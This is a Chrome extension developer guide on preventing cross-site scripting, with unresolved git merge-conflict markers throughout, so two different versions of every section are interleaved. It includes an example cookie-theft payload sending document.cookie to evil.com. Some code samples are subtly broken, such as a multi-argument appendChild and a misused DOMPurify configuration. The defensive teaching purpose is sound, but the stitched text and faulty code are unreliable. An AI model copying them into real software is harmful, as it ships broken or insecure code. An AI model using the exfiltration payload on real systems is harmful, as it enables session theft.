---
layout: default
title: "Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation"
<<<<<<< HEAD
description: "Master XSS prevention in Chrome extensions with DOMPurify, Trusted Types, Sanitizer API, and secure DOM manipulation. Protect your extension from injection attacks."
=======
description: "A comprehensive developer guide for preventing cross-site scripting (XSS) in Chrome extensions. Learn about extension-specific XSS vectors, DOMPurify integration, Trusted Types API, message passing sanitization, and security best practices."
>>>>>>> content/tab-suspender-vs-great-suspender
canonical_url: "https://theluckystrike.github.io/chrome-extension-guide/guides/chrome-extension-xss-prevention-input-sanitization/"
---

# Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation

<<<<<<< HEAD
Cross-site scripting (XSS) represents one of the most dangerous and prevalent security vulnerabilities affecting Chrome extensions. Unlike traditional web applications, Chrome extensions operate with elevated privileges and direct access to powerful browser APIs, making XSS vulnerabilities in extensions potentially far more damaging than in regular websites. An exploited XSS vulnerability in your extension can grant attackers access to sensitive user data, session cookies, browsing history, and even control over the user's browser. This comprehensive guide provides you with the knowledge, tools, and practical patterns needed to build XSS-resistant Chrome extensions that protect your users from these serious security threats.

Understanding XSS in the extension context requires recognizing that the attack surface extends far beyond typical web application vulnerabilities. Chrome extensions interact with web content, browser APIs, and cross-origin resources in ways that create unique attack vectors. Content scripts inject code into arbitrary web pages, popup pages handle sensitive user preferences, background scripts manage complex state, and message passing channels connect these disparate components. Each of these areas presents distinct opportunities for XSS exploitation if not properly secured.

## Extension-Specific XSS Vectors

Chrome extensions face XSS risks that differ significantly from standard web applications due to their unique architecture and privileges. The most critical distinction is that extensions operate in a privileged context with access to powerful APIs that regular websites cannot access. When an XSS vulnerability exists in an extension, attackers gain access to these elevated privileges, potentially allowing them to read all browser tabs, modify browsing behavior, access stored credentials, and exfiltrate sensitive data.

Content scripts represent the most exposed attack surface in most extensions. These scripts run within the context of web pages that you do not control, meaning any data received from the page or displayed to the page must be treated as potentially malicious. If your content script displays data from the page without proper sanitization, attackers can inject malicious scripts that execute with your extension's elevated privileges. This is particularly dangerous because content scripts share the DOM with the host page, creating numerous opportunities for injection through event handlers, JavaScript URLs, and dynamic content evaluation.

Background scripts, while not directly exposed to web page content, can still be vulnerable through message passing. If your extension allows content scripts or web pages to send messages to background scripts, and those messages are processed without validation, attackers can trigger malicious actions. Similarly, popup pages and options pages that display user-controlled data or data fetched from external sources require careful sanitization to prevent injection attacks.

The extension's own origin (chrome-extension://[extension-id]) provides some isolation from malicious web content, but this isolation is not absolute. Extensions must still handle data from untrusted sources including user input, messages from content scripts, responses from external APIs, and data stored in localStorage or chrome.storage. Each of these data sources represents a potential XSS vector if the data is not properly sanitized before rendering or execution.

## The Dangers of innerHTML

The innerHTML property represents one of the most common sources of XSS vulnerabilities in extension development. When you assign HTML content to innerHTML, the browser parses the string and constructs DOM elements, which means any embedded script tags or event handlers will be executed. This behavior makes innerHTML extremely dangerous when handling any data that originates from untrusted sources, including user input, web page content, API responses, or stored data.

Consider a typical extension feature that displays page information in a popup:

```javascript
// DANGEROUS: Never do this with untrusted data
function displayPageInfo(pageData) {
  const container = document.getElementById('info');
  container.innerHTML = `<h1>${pageData.title}</h1>
                         <p>${pageData.description}</p>
                         <img src="${pageData.imageUrl}">`;
}
```

If an attacker controls the pageData object, they can easily inject malicious scripts through payloads like `<img src=x onerror="alert('XSS')">` or steal cookies through `document.location='https://evil.com/?cookie='+document.cookie`.

The proper approach is to use textContent for text data, which automatically escapes HTML entities and treats all content as plain text:

```javascript
// SAFE: Using textContent for text data
function displayPageInfo(pageData) {
  const container = document.getElementById('info');
  container.textContent = ''; // Clear existing content
  
  const title = document.createElement('h1');
  title.textContent = pageData.title;
  
  const description = document.createElement('p');
  description.textContent = pageData.description;
  
  container.appendChild(title, description);
}
```

When you genuinely need to render HTML markup, you must sanitize the content first using a robust HTML sanitization library. Even when the data appears to come from a trusted source, malicious actors can often find ways to inject payloads, making sanitization essential for any HTML rendering.

## DOMPurify Integration

DOMPurify is the gold standard for HTML sanitization in JavaScript applications, and it should be your primary tool for safely rendering HTML content in Chrome extensions. Unlike simple regex-based sanitization approaches, DOMPurify uses a robust parsing engine that understands HTML semantics and can accurately strip dangerous elements while preserving safe formatting. It is actively maintained, thoroughly tested, and trusted by major organizations worldwide.

Integrating DOMPurify into your extension requires adding the library to your project and using it consistently whenever you need to render HTML:
=======
Cross-site scripting (XSS) remains one of the most critical security vulnerabilities in web applications, and Chrome extensions are particularly susceptible due to their elevated privileges and complex interaction patterns. While extensions operate within the browser's security sandbox, they often have access to sensitive APIs, user data, and the ability to modify web page content. A successful XSS attack against an extension can lead to credential theft, data exfiltration, unauthorized API access, and complete compromise of user privacy. This guide provides a comprehensive examination of XSS prevention strategies specifically tailored for Chrome extensions, covering both fundamental principles and advanced defensive techniques.

## Understanding Extension-Specific XSS Vectors {#extension-specific-xss-vectors}

Chrome extensions face unique XSS challenges that differ from traditional web applications. The extension ecosystem involves multiple execution contexts: background scripts, content scripts, popup pages, options pages, and side panels. Each of these contexts can become a vector for XSS attacks, and understanding these attack surfaces is essential for building secure extensions.

The most common XSS vectors in Chrome extensions originate from untrusted data sources that extensions routinely process. Web page content accessed through content scripts represents a significant attack surface, as attackers can inject malicious scripts into web pages specifically designed to exploit extension vulnerabilities. When your content script reads data from the DOM using methods like `document.innerHTML` or `document.write()`, any malicious scripts embedded in the page will execute within the extension's context, potentially giving attackers access to extension APIs and stored data.

Message passing between extension components creates another critical attack vector. Extensions frequently use `chrome.runtime.sendMessage` and `chrome.runtime.onMessage` to communicate between content scripts and background scripts. If message handlers fail to validate and sanitize incoming messages, attackers can inject malicious payloads that trigger unintended behavior. This is especially dangerous because message handlers often have access to powerful extension APIs that could expose sensitive user data or perform privileged operations.

Extension popups and options pages are vulnerable to XSS when they display data from external sources without proper sanitization. If your popup renders user-supplied content, data fetched from web APIs, or information extracted from web pages, you must treat all of this data as potentially malicious. Even data that originates from your own background script should be validated before rendering, as it may have originated from a compromised content script.

## The Dangers of innerHTML {#innerhtml-dangers}

The `innerHTML` property is one of the most dangerous methods for manipulating DOM content in extension contexts. When you assign HTML content to an element's `innerHTML` property, the browser parses the string and executes any embedded script tags. This behavior makes `innerHTML` a primary vector for XSS attacks, and its use should be avoided whenever possible in extension code.

Consider a content script that extracts page content and displays it in the extension popup:

```javascript
// DANGEROUS: Never do this
function displayPageContent(htmlContent) {
  document.getElementById('content').innerHTML = htmlContent;
}
```

If an attacker controls the `htmlContent` variable—perhaps through a compromised web page—they can inject malicious scripts that execute in your extension's context. Once a script executes within the extension, it can access `chrome.runtime` APIs, read stored extension data, intercept messages, and perform actions on behalf of the user.

The secure alternative is to use text content APIs that treat all input as literal text rather than HTML:

```javascript
// SAFE: Using textContent instead of innerHTML
function displayPageContent(textContent) {
  document.getElementById('content').textContent = textContent;
}
```

When you must render HTML content from untrusted sources, you must sanitize it first using a dedicated sanitization library. Even then, prefer safer alternatives like creating elements programmatically:

```javascript
// SAFER: Create elements programmatically
function createSafeElement(tagName, text, attributes) {
  const element = document.createElement(tagName);
  element.textContent = text;
  Object.entries(attributes || {}).forEach(([key, value]) => {
    element.setAttribute(key, value);
  });
  return element;
}
```

## DOMPurify Integration {#dompurify-integration}

DOMPurify is the gold standard for sanitizing HTML content in web applications, and it works equally well within Chrome extensions. It parses HTML, removes dangerous elements and attributes while preserving safe markup, and returns clean HTML that can be safely rendered. Integrating DOMPurify into your extension provides defense-in-depth against XSS attacks from untrusted content.

To use DOMPurify in your extension, install it via npm or download the standalone version:

```bash
npm install dompurify
```

Then integrate it into your content scripts or popup code:
>>>>>>> content/tab-suspender-vs-great-suspender

```javascript
import DOMPurify from 'dompurify';

<<<<<<< HEAD
// Safe HTML rendering with DOMPurify
function renderUserContent(htmlContent) {
  const container = document.getElementById('content');
  // Configure DOMPurify to allow specific tags and attributes
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['class'],
    ALLOW_DATA_ATTR: false
  });
  container.innerHTML = clean;
}
```

The key to effective DOMPurify usage is the configuration. The library is designed to be restrictive by default, allowing only safe tags and attributes. You should carefully evaluate what your extension actually needs and configure the whitelist accordingly. Avoid the temptation to use `ALLOWED_TAGS: []` or overly permissive configurations just to make development easier, as this defeats the purpose of using a sanitization library.

For extensions that need to display more complex HTML, such as user-generated content or content scraped from websites, consider using DOMPurify in conjunction with sandboxed pages. The [Content Security Policy guide](../guides/chrome-extension-content-security-policy.md) explains how to configure sandbox pages that run in an isolated context with no access to extension APIs, providing an additional layer of security for rendering untrusted HTML.

## Trusted Types API

The Trusted Types API represents a modern approach to preventing DOM XSS attacks by enabling policies that restrict dangerous DOM operations. When enabled, browsers prevent assignment to innerHTML, document.write, and other high-risk APIs unless the content comes from a trusted type created by your policy. This transforms XSS prevention from a runtime responsibility into a compile-time and enforcement-time guarantee.

Implementing Trusted Types in your extension requires defining a policy that controls how HTML, scripts, and other potentially dangerous content can be created:

```javascript
// Create a Trusted Types policy
const policy = trustedTypes.createPolicy('extensionPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScript: (input) => {
    // Only allow pre-approved scripts
    if (!isApprovedScript(input)) {
      throw new Error('Script not approved');
    }
    return input;
  }
});

// Safe innerHTML usage through Trusted Types
function displayContent(content) {
  const trusted = policy.createHTML(content);
  document.getElementById('container').innerHTML = trusted;
}
```

To enable Trusted Types in your extension, add the appropriate Content Security Policy directive in your manifest:
=======
// Sanitize HTML before rendering
function sanitizeAndRender(htmlContent) {
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'ul', 'li', 'ol', 'a'],
    ALLOWED_ATTR: ['href', 'class'],
    ALLOW_DATA_ATTR: false,
  });
  document.getElementById('content').innerHTML = clean;
}
```

The key to effective DOMPurify configuration is the principle of least privilege—allow only the tags and attributes your extension absolutely needs. A restrictive configuration that permits only plain text and basic formatting is safer than a permissive configuration that allows complex HTML.

For content scripts that process web page content, configure DOMPurify to remove all script tags and event handlers:

```javascript
const purify = DOMPurify({
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
});
```

DOMPurify also supports custom hooks that allow you to further process nodes during sanitization. You can use hooks to remove dangerous URL schemes, validate URLs against allowlists, or strip specific patterns that your threat model identifies as risky.

## Trusted Types API {#trusted-types-api}

The Trusted Types API provides a modern, browser-enforced mechanism for preventing XSS attacks by requiring that certain DOM operations receive typed objects rather than raw strings. Chrome supports Trusted Types, and using them in your extension adds a powerful layer of defense that cannot be bypassed by simple string manipulation.

Trusted Types work by requiring you to create specific type objects for potentially dangerous operations. Instead of assigning a raw string to `element.innerHTML`, you must create a `TrustedHTML` object using a policy:

```javascript
// Create a Trusted Types policy
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: (input) => DOMPurify.sanitize(input),
});

// Use the policy to create trusted HTML
const trusted = policy.createHTML('<p>User content here</p>');
document.getElementById('content').innerHTML = trusted; // Works
// document.getElementById('content').innerHTML = '<p>Raw string</p>'; // Throws error
```

When Trusted Types are enforced, attempting to assign a raw string to protected properties like `innerHTML`, `outerHTML`, or `insertAdjacentHTML` will throw a TypeError. This prevents accidental XSS vulnerabilities by making secure coding the only option.

To enable Trusted Types enforcement in your extension, add a Content Security Policy header in your `manifest.json`:
>>>>>>> content/tab-suspender-vs-great-suspender

```json
{
  "content_security_policy": {
<<<<<<< HEAD
    "extension_pages": "script-src 'self'; object-src 'none'; trusted-types default extensionPolicy"
=======
    "extension_pages": "script-src 'self'; object-src 'self'; require-trusted-types-for 'script'"
>>>>>>> content/tab-suspender-vs-great-suspender
  }
}
```

<<<<<<< HEAD
Trusted Types provide excellent defense in depth, but they work best when combined with other security measures. Not all browsers support Trusted Types equally, and some legacy code patterns may be difficult to migrate. Consider Trusted Types as an additional layer of protection rather than a replacement for proper sanitization with DOMPurify.

## Message Passing Sanitization

Chrome extensions rely heavily on message passing between content scripts, background scripts, popup pages, and options pages. This communication pattern creates security implications because messages often contain data from untrusted sources that must be validated before processing or display. Understanding how to properly secure message passing is essential for building secure extensions.

Content scripts are particularly vulnerable because they receive messages from the background script but also have access to the DOM of potentially malicious web pages. Any data passed through message channels should be treated as untrusted and sanitized appropriately:

```javascript
// Content script: Receiving messages from background
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'displayData') {
    // Always sanitize data received via message passing
    const sanitized = DOMPurify.sanitize(message.content);
    document.getElementById('container').innerHTML = sanitized;
  }
});

// Background script: Validate before sending
function sendDataToContent(tabId, data) {
  // Validate data before sending
  const validated = validateAndSanitize(data);
  chrome.tabs.sendMessage(tabId, {
    type: 'displayData',
    content: validated
  });
}
```

Implement a validation layer for all message handlers that checks message structure, validates data types, and sanitizes content before using it. This is especially important for messages that will be rendered in the DOM or used in security-sensitive operations.

The [Secure Message Passing](../guides/chrome-extension-secure-message-passing.md) guide provides comprehensive coverage of security patterns for extension message passing, including input validation, output encoding, and communication channel security.

## Content Script Injection Risks

Content scripts run in the context of web pages that you do not control, making them particularly susceptible to injection attacks. Even if your content script itself is secure, it interacts with a potentially hostile environment that can attack your code in various ways. Understanding these risks helps you design content scripts that remain secure despite their challenging execution environment.

One common attack vector is DOM manipulation by the host page after your content script runs. If your script stores references to DOM elements and later uses those references, a malicious page could have modified those elements or their properties between your access and usage. Always obtain DOM references immediately before use rather than storing them:

```javascript
// VULNERABLE: Stored DOM reference
let container;
function init() {
  container = document.getElementById('target');
}
function render(data) {
  container.innerHTML = data; // Page could have replaced this element
}

// SECURE: Immediate DOM access
function render(data) {
  const container = document.getElementById('target');
  container.textContent = data;
}
```

Another risk comes from prototype pollution and property injection in JavaScript objects. If your content script uses objects from the page context, malicious code could have modified prototypes to inject behavior. Always use objects created in your own context, and be cautious about using Object.assign or spread operators with page-provided data.

## Popup and Options Page Security

Popup pages and options pages represent your extension's primary user interface, and they handle sensitive data including user preferences, authentication credentials, and extension state. These pages must be secured against both external attackers and malicious web content that might attempt to exploit them through various channels.

Never assume that data stored in chrome.storage is safe to display without sanitization. While storage is isolated from web page access, the data could have been injected by a compromised content script or background script. Always validate and sanitize data from storage before rendering it in the DOM:

```javascript
// Retrieve and sanitize stored data before display
async function loadPreferences() {
  const data = await chrome.storage.local.get(['userData']);
  const container = document.getElementById('preferences');
  
  if (data.userData && data.userData.name) {
    // Always sanitize before innerHTML
    container.textContent = data.userData.name;
=======
Trusted Types work best when combined with a sanitization policy. The policy acts as a single choke point where all HTML content is sanitized before being used in DOM operations. This pattern is sometimes called "sink-based prevention" because it secures the sinks (DOM APIs that execute code) rather than trying to filter input at every source.

## Message Passing Sanitization {#message-passing-sanitization}

Chrome extension message passing is a powerful feature that enables communication between different extension components, but it also creates significant security risks if not handled carefully. Every message handler should treat incoming messages as potentially malicious and validate their contents before processing.

The fundamental principle is to validate the message origin and payload at every message handler:

```javascript
// SECURE: Validate sender and message content
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // Verify the sender is from an allowed context
  const allowedOrigins = ['https://example.com', 'https://trusted-site.org'];
  
  if (sender.url && !allowedOrigins.some(origin => sender.url.startsWith(origin))) {
    console.error('Message from unauthorized origin:', sender.url);
    return false;
  }
  
  // Validate message structure
  if (!message || typeof message !== 'object') {
    sendResponse({ error: 'Invalid message format' });
    return false;
  }
  
  // Validate expected fields
  if (message.type === 'fetchData') {
    if (typeof message.url !== 'string' || !isValidUrl(message.url)) {
      sendResponse({ error: 'Invalid URL' });
      return false;
    }
    // Process validated message
    handleDataRequest(message.url).then(sendResponse);
    return true;
  }
  
  return false;
});

function isValidUrl(url) {
  try {
    const parsed = new URL(url);
    return ['https:', 'http:'].includes(parsed.protocol);
  } catch {
    return false;
>>>>>>> content/tab-suspender-vs-great-suspender
  }
}
```

<<<<<<< HEAD
Options pages that allow users to configure extension behavior should validate all input before saving. Malicious extensions or compromised contexts could potentially send messages to your options page with crafted payloads. Implement robust input validation that checks data types, lengths, and formats before accepting any configuration changes.

## Content Security Policy as Defense Layer

Content Security Policy provides the foundation of your extension's XSS defense strategy. While sanitization libraries like DOMPurify protect against XSS in specific code paths, CSP establishes broad protections that defend your entire extension automatically. A properly configured CSP can block XSS attacks even when your code contains vulnerabilities, providing crucial defense in depth.

The [Content Security Policy Guide](../guides/chrome-extension-content-security-policy.md) covers CSP configuration in detail, but the essential principle for XSS prevention is restricting script sources to trusted origins only. Your CSP should allow scripts only from your extension's origin, and you should explicitly disable dynamic script execution:
=======
Message validation should include type checking, schema validation, and range checking for numeric values. Consider using a validation library like Zod or Joi to define schemas for expected message formats:

```javascript
import { z } from 'zod';

const DataRequestSchema = z.object({
  type: z.literal('fetchData'),
  url: z.string().url(),
  maxResults: z.number().int().positive().max(100).default(10),
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  const result = DataRequestSchema.safeParse(message);
  if (!result.success) {
    sendResponse({ error: 'Invalid message schema' });
    return false;
  }
  
  // Process validated message
  handleDataRequest(result.data).then(sendResponse);
  return true;
});
```

## Content Script Injection Risks {#content-script-injection-risks}

Content scripts execute in the context of web pages and have access to both the page's DOM and extension APIs. This dual access creates unique security challenges, as content scripts can inadvertently become attack vectors for XSS vulnerabilities.

The most common mistake is accessing page content without sanitization:

```javascript
// DANGEROUS: Reading unsanitized page content
function extractPageTitle() {
  const title = document.title;
  // Using title directly without sanitization
  return title;
}

// DANGEROUS: Using page HTML without sanitization
function getPageContent() {
  return document.body.innerHTML;
}
```

While reading page content is generally safe, the danger emerges when this content is used in ways that could execute code. Always sanitize content from the page before using it in DOM operations, message passing, or storage:

```javascript
// SAFE: Sanitize page content before use
import DOMPurify from 'dompurify';

function getSafePageContent() {
  return DOMPurify.sanitize(document.body.innerHTML);
}

function displayPageSummary() {
  const title = DOMPurify.sanitize(document.title, { ALLOWED_TAGS: [] });
  document.getElementById('summary').textContent = title;
}
```

Content scripts should also be careful about eval and Function constructors, which can execute arbitrary code:

```javascript
// NEVER use these with untrusted input
eval(userInput);              // DANGEROUS
new Function(userInput)();    // DANGEROUS
setTimeout(userInput, 0);     // DANGEROUS
```

Instead, use safer alternatives that treat input as data rather than code:

```javascript
// SAFE alternatives
setTimeout(() => processUserData(userData), 0);
document.querySelector('#target').textContent = userData;
```

## Popup and Options Page Security {#popup-options-page-security}

Extension popups and options pages are HTML pages that run in the extension's context. While they don't have direct access to web page content, they often display data from external sources or content scripts, making XSS prevention essential.

Always validate and sanitize any data displayed in popups or options pages:

```javascript
// SECURE: Validate data in popup
function displayMessage(message) {
  const element = document.createElement('div');
  // textContent automatically escapes HTML
  element.textContent = message.text || 'No message';
  document.body.appendChild(element);
}

// Or sanitize if HTML is needed
function displayRichMessage(message) {
  const clean = DOMPurify.sanitize(message.html, { ALLOWED_TAGS: ['b', 'i', 'a'] });
  document.getElementById('message').innerHTML = clean;
}
```

Options pages that accept user configuration should validate all inputs before storing or using them:

```javascript
// SECURE: Validate options before saving
function saveOptions(options) {
  const validated = {
    apiEndpoint: validateUrl(options.apiEndpoint),
    maxResults: validateNumber(options.maxResults, 1, 100),
    enabled: typeof options.enabled === 'boolean' ? options.enabled : true,
  };
  chrome.storage.local.set({ options: validated });
}

function validateUrl(url) {
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' ? url : '';
  } catch {
    return '';
  }
}

function validateNumber(value, min, max) {
  const num = Number(value);
  return isNaN(num) ? min : Math.max(min, Math.min(max, num));
}
```

## Content Security Policy as Defense Layer {#csp-defense-layer}

Content Security Policy (CSP) is your first line of defense against XSS attacks. A properly configured CSP restricts what resources can be loaded and what code can execute in your extension pages. Chrome extensions support CSP headers through the manifest.json file.

Configure a strict CSP in your manifest:
>>>>>>> content/tab-suspender-vs-great-suspender

```json
{
  "content_security_policy": {
<<<<<<< HEAD
    "extension_pages": "script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'"
=======
    "extension_pages": "script-src 'self'; object-src 'self'; style-src 'self' 'unsafe-inline';"
>>>>>>> content/tab-suspender-vs-great-suspender
  }
}
```

<<<<<<< HEAD
The object-src 'none' directive is particularly important for XSS prevention because it blocks plugins and embedded content that could be used for injection attacks. Combined with script-src 'self', this configuration prevents most forms of XSS from succeeding even if your code contains vulnerabilities.

## The Sanitizer API

The Sanitizer API represents the modern browser-native approach to HTML sanitization, currently supported in Chrome and other Chromium-based browsers. Unlike DOMPurify, which requires including an external library, the Sanitizer API is built into the browser and provides standardized, performant sanitization without dependencies:
=======
A strict CSP limits execution to your extension's own scripts, prevents loading external resources, and blocks inline scripts. While `'unsafe-inline'` is sometimes necessary for compatibility, avoid it when possible and use separate script files instead.

For extensions that need to load external resources (like fonts or analytics), expand the policy carefully:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; connect-src https://api.example.com;"
  }
 }
```

Content scripts inherit the CSP of the pages they run on, but you can set a more restrictive policy for content script execution using the `content_scripts` matches and the extension's own CSP. However, note that content scripts are subject to the page's CSP when interacting with page DOM.

## The Sanitizer API {#sanitizer-api}

The HTML Sanitizer API is a browser-native alternative to DOMPurify that provides built-in sanitization without external dependencies. While not yet supported in all browsers, Chrome includes support for this API, making it a viable option for extensions targeting modern browsers.

The Sanitizer API provides a straightforward interface:
>>>>>>> content/tab-suspender-vs-great-suspender

```javascript
// Using the native Sanitizer API
const sanitizer = new Sanitizer({
<<<<<<< HEAD
  allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br'],
  allowedAttributes: { 'class': [] }
});

function sanitizeAndRender(htmlString) {
  const container = document.getElementById('content');
  // Sanitizer.setHTML parses and sanitizes in one step
  sanitizer.setHTML(container, htmlString);
}
```

The Sanitizer API provides security guarantees that match or exceed DOMPurify while offering better performance through native browser optimization. However, browser support is still limited compared to DOMPurify, so you may need to use feature detection and provide a fallback for older browsers:

```javascript
function sanitizeHtml(input) {
  if ('Sanitizer' in window) {
    const sanitizer = new Sanitizer({});
    return sanitizer.sanitizeFor('div', input).innerHTML;
  } else {
    // Fallback for browsers without Sanitizer API
    return DOMPurify.sanitize(input);
  }
}
```

## Automated Security Scanning

Automated tools can help identify XSS vulnerabilities and other security issues in your extension code before attackers find them. Integrating security scanning into your development workflow catches vulnerabilities early when they are easier and cheaper to fix. Several tools are specifically useful for Chrome extension security analysis.

Linting tools like ESLint can be configured with security-focused rules that detect potentially dangerous patterns in your code. Plugins like eslint-plugin-security identify common vulnerability patterns including use of innerHTML with untrusted data, eval usage, and other risky patterns:

```javascript
// ESLint configuration for security
=======
  allowElements: ['p', 'b', 'i', 'strong', 'a'],
  dropAttributes: {
    'a': ['onclick', 'onerror'],
  },
});

function sanitizeHTML(input) {
  const element = document.createElement('div');
  element.innerHTML = input;
  return sanitizer.sanitize(element).innerHTML;
}
```

The Sanitizer API automatically removes script tags, event handlers, and dangerous attributes. Its configuration is more limited than DOMPurify's, but it provides strong security guarantees with zero dependencies.

For maximum compatibility, consider using the Sanitizer API with a fallback to DOMPurify:

```javascript
function sanitize(input) {
  if (window.Sanitizer) {
    const sanitizer = new Sanitizer({ allowElements: ['b', 'i', 'p', 'a'] });
    const element = document.createElement('div');
    element.setHTML(input, { sanitizer });
    return element.innerHTML;
  }
  // Fallback for browsers without Sanitizer API
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: ['b', 'i', 'p', 'a'] });
}
```

## Automated Security Scanning {#automated-security-scanning}

Automated tools can help identify potential XSS vulnerabilities in your extension before they become exploitable. Several scanners are specifically designed for Chrome extensions or can be adapted for extension analysis.

The Chrome Web Store's own review process includes automated scanning, but you should catch issues before submission. Consider integrating these tools into your development workflow:

**OWASP ZAP** can scan your extension's popup and options pages for XSS vulnerabilities. Run it against a local server serving your extension pages.

**eslint-plugin-security** can identify potentially dangerous patterns in your JavaScript code:

```bash
npm install --save-dev eslint-plugin-security
```

Configure it to flag dangerous patterns:

```json
>>>>>>> content/tab-suspender-vs-great-suspender
{
  "plugins": ["security"],
  "rules": {
    "security/detect-unsafe-regex": "error",
    "security/detect-non-literal-fs-filename": "error",
    "security/detect-non-literal-regexp": "error",
<<<<<<< HEAD
=======
    "security/detect-non-literal-constructor": "error",
>>>>>>> content/tab-suspender-vs-great-suspender
    "security/detect-eval-with-expression": "error",
    "security/detect-possible-timing-attacks": "error",
    "security/detect-pseudoRandomBytes": "error"
  }
}
```

<<<<<<< HEAD
Extension-specific security scanners can analyze your manifest.json and extension structure for common issues. The Chrome Web Store now performs automated security analysis during review, but catching issues earlier in development is always preferable.

## OWASP for Chrome Extensions

The Open Web Application Security Project (OWASP) maintains resources specifically relevant to Chrome extension security. While the OWASP Top 10 focuses on web applications, the organization also provides guidance on extension-specific vulnerabilities and attack vectors that every extension developer should understand.

Key OWASP resources for extension developers include guidance on injection prevention, proper input validation, secure coding practices, and threat modeling. The principles align with general web security best practices but require specific attention to the unique characteristics of extension architecture.

Reviewing your extension against OWASP guidelines during development helps ensure you have addressed the most common and impactful security vulnerabilities. The [Security Hardening Guide](../guides/security-hardening.md) provides practical implementation patterns that align with OWASP recommendations for Chrome extensions.

## Conclusion

Building XSS-resistant Chrome extensions requires a defense-in-depth approach that combines multiple security measures. Never rely on a single technique; instead, layer sanitization, CSP, input validation, and secure coding practices to create robust protection against injection attacks. DOMPurify or the native Sanitizer API should be used for any HTML rendering, Trusted Types provide modern protection where supported, and Content Security Policy establishes baseline defense across your entire extension.

Remember that extension privileges amplify the impact of XSS vulnerabilities, making security investment particularly important. Treat all external data as potentially malicious, validate and sanitize rigorously, and test your extension against common attack patterns. Your users trust you with their browsing experience and data, and that trust requires unwavering commitment to security best practices.

---

*Part of the Chrome Extension Guide by theluckystrike. More at [zovo.one](https://zovo.one)*
=======
**Retire.js** checks your dependencies for known vulnerabilities:

```bash
npm install -g retire
retire --path ./node_modules
```

## OWASP for Extensions {#owasp-for-extensions}

The OWASP (Open Web Application Security Project) Foundation provides resources specifically addressing extension security. The OWASP Top 10 for web applications includes XSS as a persistent threat, and extension developers should understand how these general web vulnerabilities manifest in the extension context.

Key OWASP principles applied to Chrome extensions:

**A01:2021 - Broken Access Control**: Ensure content scripts cannot access extension APIs beyond their intended scope. Use separate content scripts for different privilege levels.

**A03:2021 - Injection**: This directly relates to XSS prevention. Never concatenate user input into HTML, SQL queries, or shell commands.

**A05:2021 - Security Misconfiguration**: Review your CSP, permissions, and manifest configuration. Request only necessary permissions and configure CSP strictly.

**A06:2021 - Vulnerable and Outdated Components**: Keep all dependencies updated. Regularly audit your dependency tree for known vulnerabilities.

**A08:2021 - Software and Data Integrity Failures**: Verify the integrity of data received from web pages and external APIs. Don't trust data based solely on its source.

---

## Related Articles

- [Security Best Practices](../guides/security-best-practices.md)
- [Security Hardening](../guides/security-hardening.md)
- [CSP Troubleshooting](../guides/csp-troubleshooting.md)
- [Content Script Isolation](../guides/content-script-isolation.md)
- [Permissions Model](../guides/permissions-model.md)

---

*Part of the Chrome Extension Guide by theluckystrike. More at zovo.one.*
>>>>>>> content/tab-suspender-vs-great-suspender
